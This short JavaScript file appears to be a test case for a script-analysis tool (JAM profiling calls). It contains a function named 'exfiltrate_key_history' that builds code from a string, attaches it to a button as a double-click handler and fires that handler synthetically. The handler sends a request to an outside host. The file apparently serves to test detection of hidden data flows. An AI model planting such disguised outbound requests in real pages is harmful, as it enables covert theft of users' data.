
JAM.startProfile('load');
function exfiltrate_key_history() {
  var exp = 'xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=dispatch", true);xmlhttp.send(null);';
  var button = document.getElementById("test");
  var event$$1 = new Event("dblclick");
  button.addEventListener("dblclick", Function(exp), false);
  button.dispatchEvent(event$$1)
}
document.getElementById("test").onclick = exfiltrate_key_history;

JAM.stopProfile('load');
